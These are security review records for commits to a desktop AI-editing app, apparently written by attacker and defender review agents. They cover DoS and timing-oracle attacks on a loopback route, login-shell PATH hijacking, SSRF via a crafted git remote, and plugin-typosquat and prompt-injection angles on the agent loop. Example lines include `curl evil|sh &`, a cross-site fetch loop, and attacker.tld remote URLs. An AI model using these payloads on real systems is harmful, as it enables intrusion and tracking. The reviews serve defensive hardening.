decision.rationale: ## Security attacker review — adversarial threat model (DDR-128 readiness check + sidecar PATH fix) ### Change summary - Plan: `.ai/plans/feature-onboarding-readiness-check.md` - DDR: `.ai/archive/decisions/DDR-128-first-open-readiness-check-detect-and-guide.md` - Commit: `6089ad0` — "feat(desktop): first-open AI-editing readiness check + sidecar PATH fix" - Files touched: 9 (Rust sidecar, new `readiness.ts`, new `ReadinessList.jsx`, ChatPanel/Onboarding/app wiring, route reg in `http.ts`, test, docs) - AI / MCP surface touched: YES — the readiness report renders in the ChatPanel (an ACP/agent surface), and the sidecar PATH feeds the env the paired `claude` adapter inherits. ### What I tried to break, and what held Three classic angles were given. After tracing each forward, **two are genuinely not exploitable as built** and one is a **real, phase-introduced availability bug**. The interesting findings are off-script: the PATH-injection escalation reframing and a recon side-channel that the "main-origin-only" label papers over. --- ### Threat model — trust boundaries - **Finder-launched `.app` → login shell (NEW).** `sidecar.rs::resolve_login_path` spawns `$SHELL -ilc '…'` at every app boot and injects the captured `$PATH` into the sidecar env. This newly makes the user's `.zshenv`/`.zprofile`/`.zshrc` *execute on every GUI launch of Maude* — a code path that did not exist before (a Finder-launched app never sourced rc files). - **Sidecar env → spawned `claude` adapter (WIDENED).** `acp/bridge.ts` spawns the adapter with `scrubAgentEnv(process.env)`, which now carries the richer login-shell PATH. Every downstream binary lookup (`Bun.which`, the adapter's own `claude`, and `claude`'s `maude design ` shell-outs) now resolves against a *wider* search path than before the fix. - **Cross-site browser tab → `http://127.0.0.1:4399/_api/preflight` (NEW ROUTE).** A new unauthenticated GET route on the main server with **no Origin/Host/CSRF gate** (the main `startServer.fetch` applies none to GET routes) and a server-side cost that can spawn login shells. - **Untrusted canvas iframe → `/_api/preflight` (asserted blocked).** Route is absent from `CANVAS_SAFE_API` + `startCanvasServer.routes`; verified it hard-403s. This boundary holds. - **`~/.claude` registry file → readiness report (asserted inert).** `scanPlugins` reads two JSON files but only ever derives *booleans* from them; no file content reaches a rendered string. This boundary holds. - **Readiness report → ChatPanel / Help modal render (asserted inert).** All `detail`/`remediation` strings are server-authored constants; `Inline` renders via React children (escaped), no `dangerouslySetInnerHTML`. This boundary holds. --- ### Findings (attacker narrative) #### F1 — Cross-site loopback DoS: one GET wedges the dev-server for ~10–15 s (MEDIUM, phase-introduced) - **I would do:** host a page at `evil.example`. When the Maude desktop user visits it in *any* browser (not the WKWebView — any browser on the machine), my page fires `fetch('http://127.0.0.1:4399/_api/preflight', {mode:'no-cors'})` in a tight loop (or a burst of `` to dodge connection caps). - **By:** `/_api/preflight` is a GET with **zero origin/Host/CSRF gating** on the main server (`startServer.fetch` only loopback-gates WS upgrades and a handful of token-bearing git routes — plain GET routes dispatch straight into the table). The default desktop port is the deterministic **4399** (sidecar spawns with no `--port`). On the *exact machine state this feature targets* — a fresh install where `maude`/`agent-browser` are not yet on PATH — `Bun.which` misses, so `resolveOnPath` falls back to **`Bun.spawnSync([$SHELL,'-ilc', …], {timeout:5000})`**. `spawnSync` is **synchronous: it blocks the entire single-threaded Bun event loop** for up to 5 s per missing binary, ×2–3 (`maude`, `agent-browser`, and `claude` if also absent). The response body is CORS-opaque to me, but I don't need to read it — the side effect (a blocked event loop) is the weapon. - **Resulting in:** each request stalls the whole dev-server (canvas serving, HMR, collab WS pumps, git routes) for up to ~10–15 s. A loop of these holds the server wedged for as long as the tab is open. No auth, no user interaction beyond visiting a page. The amplification is structural: an attacker spends one cheap HTTP GET; the victim pays a multi-second synchronous shell spawn. - **Cite:** §B7 (output/handling — untrusted-origin reachability of a high-cost operation); classic §A (missing rate-limit / unauthenticated expensive endpoint). - **Mitigation:** gate `/_api/preflight` to loopback-Host like the git routes AND add the `sameOriginWrite`-style Origin reject (a cross-site `fetch` always stamps Origin); cache the report for N seconds so repeated probes don't re-spawn; and move the login-shell fallback off `spawnSync` onto the async `Bun.spawn` so it can't block the event loop. The Rust-side PATH fix already makes the fallback near-dead in the `.app`; making it non-blocking removes the DoS lever entirely. #### F2 — Tool-presence recon side-channel via response *timing* (LOW, phase-introduced) - **I would do:** from the same cross-site loop, *time* the `/_api/preflight` response (the fetch promise resolves/rejects on completion even under `no-cors`, and total wall-time leaks through `performance.now()` around the fetch). A ~0 ms answer ⇒ `Bun.which` hit ⇒ the tool is installed and on PATH. A ~5 s/~10 s answer ⇒ the login-shell fallback fired ⇒ the tool is *absent*. - **By:** the spawn-only-on-miss design turns presence/absence of `maude`/`agent-browser`/`claude` into a multi-second timing oracle observable cross-origin without reading the (opaque) body. - **Resulting in:** an attacker fingerprints whether this victim has the Claude/maude toolchain installed — useful targeting recon (is this a Maude power-user worth a follow-up social-engineer to install a malicious plugin?). Low impact on its own; it is the *recon* leg that makes the chain below worth attempting. - **Cite:** §B7 (information disclosure via observable side-effect). - **Mitigation:** same as F1 — the loopback+Origin gate closes the cross-origin observer; constant-ish-time (cache) removes the oracle. #### F3 — Login-shell PATH injection re-frames the trust model (LOW as a standalone, but see chain) (phase-introduced *capability*, pre-existing *trust*) - **I would do (as an attacker who already has *write* to the victim's dotfiles or a wildcard-writable PATH dir):** drop a line in `~/.zshrc` / `~/.zprofile` (sourced by `-ilc`) — either arbitrary code (`curl evil|sh &`) or, more subtly, *prepend a writable dir to PATH* (`export PATH=$HOME/.local/evilbin:$PATH`) and plant a fake `maude` / `claude` / `agent-browser` there. - **By:** `resolve_login_path` *executes* `.zshrc`/`.zprofile` at every Maude launch (rc files a Finder-launched app never used to run), and the resolved PATH is injected into the sidecar and inherited by the spawned `claude` adapter via `scrubAgentEnv`. The adapter's `claude`, and its `maude design ` shell-outs, then resolve binaries against my attacker-prepended PATH. - **Resulting in:** my planted `maude`/`claude` runs with the user's identity inside the AI-edit loop. **Honest severity call:** if the attacker can already write `~/.zshrc`, they own every future interactive shell anyway — this is *not* a new privilege, it's the user trusting their own shell config (the DDR's "the user already trusts their own shell" stance is correct). The genuinely *new* surface is narrow but real: (a) the rc files now execute under a **GUI launch context** (auto-start, "open at login", a `.dmg` double-click) where the user is **not** consciously "opening a terminal," so rc-file code that was previously dormant for GUI-only users now fires; and (b) the marker-bracketed stdout parse is *robust* (good — see below), so the only injection vector is the PATH/rc contents themselves, not output smuggling. - **Stdout-smuggling sub-check (the angle in the brief): NOT exploitable.** To make the parser inject a *malicious* PATH, an attacker would need to write `__MAUDE_PATH____MAUDE_END__` to the login shell's stdout. But the value between the markers comes from `command printf '…' "$PATH"` — the shell expands `$PATH` itself; an attacker controlling stdout *noise* (p10k instant-prompt banners) only adds text *outside* the marker pair, which `find/slice` discards. To control the bytes *between* the markers the attacker must already control `$PATH` in the rc files — i.e. they're already in F3's "owns the dotfiles" precondition, gaining nothing extra from the parser. The marker design is sound. - **Cite:** §B5 (confused-deputy — low-trust rc execution feeding a higher-privilege adapter spawn); MITRE-adjacent local PATH-hijack. - **Mitigation:** (defense-in-depth, not a hard bug) consider resolving PATH with `$SHELL -lc` (login, non-interactive) instead of `-ilc` — `.zshrc` (interactive) is where ad-hoc/compromised PATH edits most often live, and dropping `-i` shrinks the executed surface to login files while still capturing Homebrew/asdf for the common case; OR resolve PATH but then *append* it to a hardened base rather than replacing, so a poisoned prepend can't shadow `/usr/bin`. Accept-as-is is defensible given the pre-existing trust; document it in DDR-128's security posture (which currently *understates* this — it says "no user-controlled command string," true, but omits that rc files now execute under GUI launch). #### NOT-A-FINDING — XSS / prompt-injection via report content (claimed angle 3): NOT exploitable - Traced every `detail`/`remediation`/`label` string in `readiness.ts`: all are **server-authored string literals**. The only interpolations are `` `Missing: ${missing}` `` (where `missing` is built from the hardcoded literals `'design@maude'`/`'flow@maude'`) and `command -v ${bin}` (where `bin` is always one of three hardcoded literals). **No `~/.claude` file content, no env var, no PATH string ever reaches a rendered field or the shell command.** `ReadinessList.Inline` renders through React children (auto-escaped); no `dangerouslySetInnerHTML`. The report never flows into a `claude` prompt (prompts forward verbatim from the composer; the readiness report is a *separate* fetch rendered as DOM, never concatenated into a prompt). So: no XSS, no indirect prompt-injection, no path to the ACP bridge via report text. This angle is **clean**. #### NOT-A-FINDING — `CLAUDE_CONFIG_DIR` redirect of the registry read: NOT attacker-reachable - `scanPlugins` honors `CLAUDE_CONFIG_DIR` to locate the registry. An attacker who could set that env var on the sidecar could point the scan at an arbitrary dir — but (a) only two fixed filenames under `plugins/` are read, (b) only booleans are derived, (c) nothing is rendered or returned but `present|missing|unknown`, and (d) setting the sidecar's env requires already controlling the launch environment (≡ F3's precondition). No information disclosure, no traversal (fixed `join`, no user path segment). Inert. --- ### Exploit chains - **Chain 1 — Targeted-recon → social-engineer the plugin install (severity stays MEDIUM; recon promotes targeting, not privilege).** - Steps: (1) F2 timing oracle from a drive-by page fingerprints "this victim runs Maude desktop but does NOT yet have the maude plugins/CLI" (the `missing` verdict via the slow-path timing). (2) Attacker serves this exact user a tailored lure: a fake "Maude quickstart" page whose copy-paste block is `/plugin marketplace add attacker/evil-maude` instead of `1aGh/maude`, or `npm i -g @1agh-maude` (typosquat). The readiness panel's own remediation text *trains* users to paste `/plugin marketplace add …` and `npm i -g …` blindly — the attacker mimics that exact UX. (3) Victim installs the attacker marketplace/plugin → tool-description injection / malicious `maude design` shell-out lands inside the AI-edit loop (§B6 MCP supply chain, §B1 tool-description injection). - Composed from: fresh attacker findings F2 (recon) + the feature's own remediation-copy UX (the panel normalizes "paste this marketplace/npm command"). No defender report exists for this HEAD to chain against. - Promoted severity: **MEDIUM** (the chain is real but each leg needs the victim to visit a lure AND paste a command; it does not auto-execute). Worth noting because the *feature itself lowers the bar* — it conditions non-technical users to run `/plugin marketplace add ` from a panel, which is precisely the muscle-memory a typosquat marketplace exploits. - **No defender report present for `6089ad0`** under `.ai/logs/security-reviews/` — so the mandated "chain the defender's mediums" pass has nothing to compose. Stated explicitly per protocol: *no defender-medium pairs available to promote; the chain above is built from fresh attacker findings.* --- ### AI / MCP attack surface - **Tool surface:** no new MCP tool/description added. The change adds a *report* that renders near the ACP panel but does not register a tool or alter a tool description. `newSession({ mcpServers: [] })` — no MCP servers wired. - **Model output → downstream:** unchanged. The readiness report is not model output; it's a server probe rendered as DOM. No model output flows to shell/SQL/path here. - **Tool output → model input:** **clean.** The readiness report is never concatenated into a `claude` prompt (prompts forward verbatim from the composer textarea only). The `~/.claude` registry read produces booleans, not prompt text. - **Trifecta check:** the *paired `claude` adapter* loop (pre-existing, DDR-123) does hold all three legs — private data (repo + disk via `cwd`), untrusted content (canvas/hub-pushed JSX, web), outbound (the adapter can edit files / shell out). **This change does not add a trifecta leg**, but it *widens* the outbound/exec leg by giving the adapter a richer PATH (F3) — more binaries are now reachable from the same loop. Flag as **PRE-EXISTING trifecta, marginally widened**, not newly introduced. Architectural mitigation owed to DDR-123, not this change. - **Confused-deputy paths:** F3 — low-trust rc-file execution feeds the high-privilege adapter's binary search path. Real but gated behind dotfile-write (the user's own trust boundary). - **Excessive-agency tools:** none added by this change. - **MCP supply chain:** no MCP server added/upgraded. *But* the readiness panel's remediation copy actively coaches users to run `/plugin marketplace add 1aGh/maude` + `npm i -g @1agh/maude` — see Chain 1: this normalizes the exact paste-a-marketplace action a typosquat would exploit. Recommend the panel make the *canonical* marketplace/package strings copy-only (a Copy button bound to a server constant, which it already is) and add a one-line "only ever `1aGh/maude`" note so a lure can't substitute its own. - **Output handling:** report strings render via escaped React children; no markdown-link/image exfil vector (the `Inline` helper only emits `` + text). Clean. - **Secret leakage via context:** the report exposes no secrets. It *does* leak tool-presence (F2) cross-origin via timing — a low-grade context leak. - **Jailbreak resilience for safety-critical decisions:** N/A — no privileged action is gated on model compliance in this change. --- ### Adversarial-creativity finding (the one the checklist misses) **The login-shell PATH resolution turns Maude into a dotfile-execution trigger under GUI/auto-start launch contexts.** A scanner sees `$SHELL -ilc` and waves it through ("resolving PATH, fine"). The non-obvious consequence: a user who *only ever launches Maude from Finder/Dock/login-items* and never opens a terminal now has their `.zshrc`/`.zprofile` **executed on every app start** — including unattended "Open at Login" boots. Any latent/compromised rc code (an old `curl|sh` someone left, a supply-chain'd `.zshrc` line from a copied dotfiles repo, a malicious `oh-my-zsh` plugin) now fires in a context the user doesn't associate with "running shell code." The 5 s timeout and `/dev/null` stdin are good hygiene against *wedging*, but they don't bound *what the rc files do* in their own 5 s. This is the kind of "the feature the dev believed was safe (it just reads PATH)" that earns the engagement: PATH resolution is incidentally an **arbitrary-rc-execution-on-GUI-launch** primitive. Mitigation: prefer `-lc` over `-ilc` (drops `.zshrc`, the likeliest dirty file), and state plainly in DDR-128's security posture that rc files now execute under GUI launch — the DDR currently claims "no new attack surface beyond a read-only `~/.claude/` read," which is **incomplete**: executing the user's interactive rc files at every GUI boot *is* new behavior worth naming. --- ### Recommended follow-ups (for the human / `/flow:execute`) 1. **(MEDIUM, ship-blocker-adjacent)** Loopback-Host + Origin-reject gate on `/_api/preflight` (parity with the git routes) — closes F1 DoS and F2 recon in one move. Today it is the *only* new GET route with no such gate. 2. **(MEDIUM)** Move the login-shell fallback off `Bun.spawnSync` to async `Bun.spawn`, and memoize the readiness report for ~30–60 s, so a missing-binary probe can never block the event loop or be hammered. 3. **(LOW)** Switch `-ilc` → `-lc` in BOTH `resolve_login_path` (Rust) and `resolveOnPath` (TS) unless an explicit user reports a Homebrew-via-`.zshrc`-only setup; shrinks the rc-execution surface (creativity finding + F3). 4. **(LOW)** Correct DDR-128 "Security posture": it currently says "no new attack surface beyond a read-only `~/.claude/` read" — add (a) the new unauthenticated loopback GET route, (b) rc-file execution under GUI launch, (c) the widened adapter PATH. Honest posture is the point of the DDR. 5. **(LOW)** Harden the remediation UX against Chain 1: keep the marketplace/package strings as server constants behind a Copy button (already the case) and add an inline "the only correct marketplace is `1aGh/maude`" guard line.

decision.title: Security defender audit — DDR-128 first-open readiness + sidecar PATH fix
decision.rationale:
# Security defender audit — DDR-128 first-open readiness + sidecar PATH fix Scope: changed source files in commit `6089ad0` ("feat(desktop): first-open AI-editing readiness check + sidecar PATH fix"). OWASP §A classic-AppSec static review. Read-only audit — no code edited. ## Evidence sources - Diff base: `6089ad0~1...6089ad0` (`git show 6089ad0`) - Source files scanned (5): - `apps/desktop/src-tauri/src/sidecar.rs` (NEW `resolve_login_path()` + PATH injection) - `apps/studio/readiness.ts` (NEW probe + `resolveOnPath` + `scanPlugins`) - `apps/studio/http.ts` (NEW `GET /_api/preflight` route) - `apps/studio/client/panels/ReadinessList.jsx` (NEW shared list/dialog) - `apps/studio/client/{app.jsx, panels/ChatPanel.jsx, panels/OnboardingWizard.jsx}` (wiring) - Cross-checked: `apps/studio/server.ts` (`startCanvasServer` route map), `apps/studio/acp/probe.ts` (`resolveClaudePath`), `apps/studio/test/acp-origin-gate.test.ts`, `apps/studio/test/readiness.test.ts` - Lockfile changes: `apps/desktop/src-tauri/Cargo.lock` (Rust deps) — see Dependency surface. ## Verdict: PASS WITH SUGGESTIONS No exploitable classic-AppSec finding. Two LOW/INFO hardening suggestions and one explicit non-finding worth recording. The headline controls all hold: - `/_api/preflight` is correctly **main-origin only** — absent from `CANVAS_SAFE_API`, from `isCanvasSafeRoute`, and from the `startCanvasServer` route map. The untrusted canvas iframe origin is 403'd (proven by `acp-origin-gate.test.ts` step 5). - The probe is **read-only** — no write/exec/network beyond the two read-only login-shell spawns; `scanPlugins` only `readFileSync`s two JSON files and parses them in try/catch. - Both `` arguments to the login-shell fallbacks are **hardcoded literals** (`claude` / `maude` / `agent-browser` / `sh`), never user/network input. - Client renders all probe strings as React **text nodes** — no `dangerouslySetInnerHTML`, no XSS lane even if a string were attacker-influenced. ### Blockers (severity >= medium) None. ### Warnings (below floor) - `apps/desktop/src-tauri/src/sidecar.rs:49` — **A8/A4 (LOW) — attacker-controlled `$SHELL` is executed as a login shell.** `resolve_login_path()` reads `std::env::var("SHELL")` and runs it with `-ilc`. This is **not** a net-new trust boundary: `$SHELL` is part of the user's own environment, the app already runs with the user's full privileges, and the ACP bridge spawns the user's `claude` anyway. An attacker who can set `$SHELL` in the app's launch environment already has code-exec as that user. The command string is a fixed literal (`command printf '__MAUDE_PATH__%s__MAUDE_END__' "$PATH"`) with **no interpolation** of untrusted data, and stdin is `/dev/null` with a 5 s worker-thread timeout, so a hostile rc cannot wedge startup. Residual: a poisoned `$SHELL`/rc could return a doctored `$PATH`, shadowing `claude`/`maude` with attacker binaries — but that is the pre-existing "untrusted dotfiles" posture, not introduced here. - Suggestion: optionally validate the resolved `$SHELL` is an absolute path to an existing executable (and/or is listed in `/etc/shells`) before spawning, purely as defense-in-depth. Not required to ship. - `apps/studio/readiness.ts:54` — **A1 (LOW, non-exploitable) — `bin` interpolated into a shell `command -v ${bin}` string.** `Bun.spawnSync([shell, '-ilc', \`command -v ${bin} …\`])` builds a shell command by string interpolation. If `bin` were ever attacker-controlled this would be command injection. **It is not** — every call site passes a compile-time string literal (`resolveOnPath('claude' | 'maude' | 'agent-browser')`, test passes `'sh'`), and the function's own doc-comment states "`bin` is always a hardcoded literal — never user input". Confirmed: no call path threads request/body/query/registry data into `bin`. - Suggestion: to make the safety structural rather than convention-based, narrow the parameter type to a string-literal union (`'claude' | 'maude' | 'agent-browser'`) so a future caller physically cannot pass dynamic input. Optional. ### Notes / non-findings (audited and cleared) - **A3/A6 origin gating — CLEARED.** `/_api/preflight` (http.ts:580) lives only in the privileged `routes` table. It is NOT in `CANVAS_SAFE_API` (http.ts:1448-1456), NOT matched by any `isCanvasSafeRoute` branch (http.ts:1478-1505), and NOT in `startCanvasServer`'s `routes` map (server.ts:226-240). On the segregated canvas origin `isCanvasSafeRoute` returns false → 403 "Forbidden (canvas origin)". The dual-allowlist invariant (DDR-088) holds; `acp-origin-gate.test.ts:65-72` asserts both the 200 (main) and 403 (canvas). - **Info leak — CLEARED.** The serialized `ReadinessReport` carries only `id`, `label`, `required`, `status` ('present'|'missing'|'unknown'), `detail`, and `remediation`. `label`, `detail`, and `remediation` are **server-authored constants** (readiness.ts:133-194). The absolute paths resolved by `resolveOnPath`/`resolveClaudePath`/`resolveAdapterEntry` are consumed only as booleans (`claude ? 'present' : 'missing'`) and never placed in the response. No home dir, username, `$PATH`, or installed-binary path is exposed to the caller. (Contrast with `/_api/acp/status`, which DOES return `adapterEntry`/`claudePath` absolute paths — but that route is likewise main-origin-only and pre-existing, out of this diff's scope.) - **A9 path traversal in the registry read — CLEARED.** `scanPlugins` (readiness.ts:100-122) joins a FIXED relative path (`plugins/known_marketplaces.json`, `plugins/installed_plugins.json`) under `claudeConfigDir()`. The only variable is `CLAUDE_CONFIG_DIR` — an env var the user owns (Claude Code's own contract), not request-derived. No request input reaches any path component; there is no `..`/user-string join. `readFileSync` following symlinks is intentional (Dotfiles). - **A8/A12 JSON parse safety — CLEARED.** `readJson` (readiness.ts:78-84) wraps `JSON.parse(readFileSync(...))` in try/catch returning null; `scanPlugins` degrades to `status:'unknown'` and `probeReadiness` never throws. Malformed/huge/absent registry files cannot crash the probe or the sidecar. (`JSON.parse` is data-only — no prototype-pollution sink is reached; values are read as booleans/strings only.) - **A6 XSS in the readiness UI — CLEARED.** `ReadinessList.jsx` renders every string through React text interpolation: `{item.label}`, `{item.detail}`, and the `Inline` component (lines 71-83) which splits on backticks and emits `{m[1]}` / `text.slice(...)` as **child text nodes** (auto-escaped). No `dangerouslySetInnerHTML` anywhere in the file. The `NotConnected` `reason` (ChatPanel.jsx) is a server constant rendered as `

{reason}

`. Even a hypothetically-poisoned string cannot inject markup. Clipboard write (`copyFix`, ReadinessList.jsx:87-96) copies `item.remediation` (server constant) with backticks stripped — no clipboard-injection of attacker data, and write is gated on `navigator.clipboard?.`. - **DoS via repeated login-shell spawns — LOW residual, accepted.** `/_api/preflight` spawns a login shell only when `Bun.which` misses (rare once the sidecar PATH is Rust-corrected), capped at one 5 s-timeout spawn per missing literal (≤4). The route is main-origin/loopback only (canvas origin is 403'd), so a remote/untrusted-iframe attacker cannot drive it. A local script hammering the loopback origin could spin shells, but that actor already has local code-exec — out of the threat model (DDR-108/109 loopback trust). No new amplification. - **Sidecar PATH injection trust boundary — CLEARED.** `sidecar.rs:107-110` injects the resolved login PATH into the dev-server child's env. This widens what the sidecar's `Bun.which`/ACP adapter can resolve, but every binary it would now find (`claude`, `maude`) is one the user themselves installed and the app already intends to drive. It does not cross a network/iframe boundary — the env applies only to the locally-spawned, loopback-bound sidecar. Best-effort with a clean no-op fallback on failure (no regression path). ## Dependency surface - `apps/desktop/src-tauri/Cargo.lock` changed (+255 lines). This is the Rust/Tauri lock for the desktop shell. No new dependency is introduced by the readiness/PATH source change itself — `resolve_login_path` uses only `std::process`, `std::sync::mpsc`, `std::thread`, `std::time` (stdlib). The lock delta appears to be a routine transitive resolve from the Tauri toolchain rather than a hand-added crate in this diff. No `build.rs`/postinstall-style script newly added in the audited source. Flagged for INFO only: a defender should confirm the Cargo.lock delta is a clean `cargo update` (no unexpected new top-level crate / no git-source override) before release — outside the source-review lane but worth a glance. - No npm lockfile change in this commit (`pnpm-lock.yaml` not in the diff). The committed `dist/*.js` artifacts are rebuilds of the audited client source, not a new dep surface. Summary: 0 blockers, 2 warnings (both LOW/non-exploitable hardening suggestions), 7 cleared notes, 1 INFO dependency-surface flag.

decision.title: # Security attacker review — adversarial threat model (DDR-133 system-git auto-detect)
decision.rationale:
## Security attacker review — adversarial threat model (DDR-133 system-git auto-detect)

### Change summary
- Plan: `.ai/plans/feature-git-switcher-fast-and-trustworthy.md` (DDR-133)
- Diff base: `fbaf628` (merge-base main…working tree; change is uncommitted)
- Files touched (in scope): `apps/studio/git/service.ts` (+191), `apps/studio/github/service.ts`, e2e harness (`apps/desktop/e2e/**`, untracked), `.claude/skills/desktop-e2e/SKILL.md`
- AI / MCP surface touched: **no** (pure git/transport plumbing + WebDriver e2e). The mandatory AI section below reads N/A with reasoning.

### What the change actually does (attacker's reading)
Before DDR-133, the engine was env-gated: `USE_SYSTEM_GIT` (a module-load const, default **false**). With it false, every read path AND the unattended ahead/behind probe ran on the pure-JS **iso** engine, which speaks HTTP(S) only and was wrapped in a host-allowlist (`!trustedHttp → {0,0}`, no network).

DDR-133 replaces that const with `await systemGitAvailable()` (`service.ts:46-62`) — true whenever a `git` binary is on PATH, i.e. **default-true on every developer machine**. The unattended status poll (`/_api/git/status?remote=1`, auto-fired on repo open + a 60 s tick + every panel re-render, DDR-132) now reaches a real `spawn('git', … 'fetch' …)` against whatever host is in `remote.origin.url`.

### Threat model — trust boundaries
- **Untrusted repo `.git/config` → server git spawn.** Opening a folder in the switcher (DDR-051/132 respawns the sidecar per repo) auto-reads `remote.origin.url` and, on the poll, hands it to the git binary. The `.git/config` rides a clone/zip and no file-review sees it — this is the DDR-131 threat model, unchanged in principle, widened in reach by the new default-on engine.
- **Server → arbitrary network host.** The poll is the outbound channel; the trigger is "victim opened a folder."
- **Keychain PAT → git child.** Token attached only on `trustedHttp` (github.com) via `http.extraheader`.

### Findings (attacker narrative)

- **F1 — Unattended SSRF / outbound beacon on non-GitHub HTTP(S) remotes (the DDR-133 regression)** (Medium → blocker at floor)
  - I would do: ship a "design starter" repo (git clone, or a zip a teammate opens) whose `.git/config` contains `remote.origin.url = http://attacker.tld/<victim-id>` (or an internal target like `http://169.254.169.254/…`, `http://10.0.0.5:6379/`, `git://blackhole:9418/x`).
  - By: the unattended probe classifies the URL, computes `trustedHttp = false`, then hits the **engine branch *before* the host-allowlist**:
    - `service.ts:1617` `trustedHttp = false`
    - `service.ts:1618` `if ((await systemGitAvailable()) || transport === 'ssh') return remoteAheadBehindSystem(dir, trustedHttp ? token : undefined, …)` → **fires for any `http` transport** because system git is present.
    - `service.ts:1621` `if (!trustedHttp) return {0,0}` — the actual control — is now **unreachable** on any machine with git installed (it only ever guarded the iso branch).
    - `remoteAheadBehindSystem` (`service.ts:1657-1670`) then runs `git … fetch <remote> <branch>` → git resolves `remote.origin.url` and connects to `attacker.tld`.
  - Contrast: the *explicit-gesture* path `gitFetchRemote` got this right — `service.ts:1089` `if (transport === 'http' && !trustedHttp) return error` refuses non-GitHub HTTP **before** the engine branch. The **unattended** probe is missing that exact line, so the highest-value sink (no user gesture, auto-repeating) is the one left open.
  - Resulting in: zero-click-beyond-open outbound callback to an attacker host — attacker server logs victim public IP + a confirmed "folder opened" signal, **repeated every ~45 s (TTL) while the project stays open** → de-anonymization / presence-tracking / canary. Secondary: blind internal SSRF (the git smart-HTTP `GET /info/refs?service=git-upload-pack` lands on internal services; ahead/behind returns 0/0 so it's blind to the attacker for internal targets, but the connection itself is made). **No PAT leak** — token is `undefined` for the untrusted host (correctly gated).
  - Empirical confirmation (the author proved my precondition for me): `.claude/skills/desktop-e2e/SKILL.md` new note — *"A fixture with a real `remote.origin.url` (e.g. `https://github.com/…`) makes the dev-server's unattended ahead/behind probe spawn a `git fetch` to that host during boot."* They observed the auto-fetch-on-open and worked around it as **test flakiness** (made the fixture refs-only), never recognizing the same mechanism with an attacker URL is an SSRF/beacon.
  - Cite: §B (excessive agency — automatic privileged network action on untrusted config) + classic SSRF (defender's §A). The DDR-131 *RCE* gate holds; this is the *host-allowlist* gate, freshly bypassed by engine-ordering.
  - Mitigation (one line): add `if (transport === 'http' && !trustedHttp) return { ahead: 0, behind: 0 };` immediately after `service.ts:1617`, mirroring `gitFetchRemote:1089` — restores the iso-era no-network behavior for untrusted HTTP hosts under the system engine.

- **F2 — `git://` and `ssh://arbitrary-host` auto-fetch on the poll (pre-existing, now bounded but still default-on)** (Low)
  - I would do: set `remote.origin.url = git://attacker.tld/x` (plaintext git protocol, port 9418) or `ssh://attacker.tld/x`.
  - By: `classifyRemoteUrl` lumps `git://` and `ssh://` into `'ssh'` (`service.ts:533-535`), and `transport === 'ssh'` has always taken the system branch (true even pre-DDR-133). So this SSRF predates this change — but DDR-133's default-on engine + the new auto-poll cadence (DDR-132) make it routinely reachable. `GIT_TERMINAL_PROMPT=0` (`service.ts:285`) prevents a credential hang; `PROBE_TIMEOUT_MS=8s` now bounds it.
  - Resulting in: same beacon/internal-connection as F1, over plaintext git protocol. No token (ssh path passes `undefined`).
  - Cite: same as F1.
  - Mitigation: gate the ssh/git branch behind a host allowlist too, or require a one-time per-remote user trust gesture before the unattended probe will touch a non-`github.com` host.

- **F3 — Attacker-controlled boot-time UI stall (bounded DoS)** (Low)
  - I would do: point `remote.origin.url` at a blackhole/slow host.
  - By: the poll fires on open and the `status?remote=1` response is awaited by the client; per the author's own SKILL.md note it "keeps the WKWebView JS unresponsive" until the fetch resolves. Now bounded to `PROBE_TIMEOUT_MS` (8 s) per open.
  - Resulting in: up to 8 s of unresponsive UI on every repo open, attacker-triggerable. Bounded, so Low — noting because it shares the F1 root cause (auto-fetch untrusted config) and is fixed by the same mitigation.
  - Mitigation: F1's allowlist makes the no-network case instant; otherwise the 8 s bound is the floor.

### Exploit chains
- **Chain 1 — "Opened-folder beacon":** F1 (auto-fetch on open) composed with the DDR-132 auto-poll cadence and DDR-051 auto-open-on-switch. Steps: (1) attacker distributes a repo with a non-GitHub HTTP `remote.origin.url`; (2) victim opens/selects it in the switcher; (3) sidecar boots, poll fires `git fetch attacker.tld` with no gesture; (4) 45 s TTL re-fires for the session lifetime. Promoted severity: **Medium** (the chain is what makes a "harmless ahead/behind probe" an attacker-observable tracking primitive). This is a fresh-attacker chain, not a defender composition.
- No defender report exists for this HEAD (`.ai/logs/security-reviews/main-*-defender.md` absent), so: **no defender medings to compose.** Medium-rated F1 stands on its own analysis.

### AI / MCP attack surface
- N/A — the change touches no model prompt, tool/MCP definition, MCP server, or model-output-to-system pipeline. It is git transport plumbing plus a WebDriver e2e harness. (`security.includeAi` default true, but there is no model surface in this diff to threat-model.)

### Adversarial-creativity finding (the thing the checklist missed)
The vulnerability is hiding **inside a test-harness lesson learned**. The author hit the exact behavior (`remote.origin.url` → unattended `git fetch` on boot), diagnosed it as **flaky tests**, fixed it **in the fixture** (`make-git-fixture.ts:66-75` deliberately writes refs-only, no `git remote add`, so `classifyRemoteUrl → 'none'`), and wrote a SKILL.md note congratulating the deterministic fix. A defender reading the diff sees a *more secure* fixture and a tidy note. The red-team reading is the inverse: the note is a **signed confession that opening a repo makes the product phone the configured host automatically**, and the fixture only neutralizes it for the *test's own* repo — production users opening a hostile repo get the live behavior, and DDR-133 just widened the host set that reaches the spawn (F1). The defensive fix in the test is the proof-of-exploit for the product.

### Explicit answers to the tasked questions
- **Can the engine auto-detect bypass the classify gate or run it out of order?** No. `classifyRemoteUrl` runs **before** the engine branch in both network sinks (`gitFetchRemote:1080`, `remoteAheadBehindUncached:1615`), and `unsafe` (the `::` transport helpers, `file://`, bare/local paths, unknown schemes) returns pre-spawn. `HARDENED_REMOTE_FLAGS` (`protocol.ext.allow=never` / `protocol.fd.allow=never`, `service.ts:564`) is still appended to **every** system spawn as the backstop. **The DDR-131 RCE / local-read / `ext::` / `fd::` / `transport::` / `file://` posture HOLDS.**
- **Can a crafted URL reach `git fetch`/spawn where it previously used iso (no spawn)?** **Yes — F1.** Not for the RCE classes (still refused), but for **non-GitHub `http(s)://`**: pre-DDR-133 the iso default + `!trustedHttp` guard meant no network; post-DDR-133 the system engine is default-on and its branch precedes the guard, so the spawn happens. That is the regression.
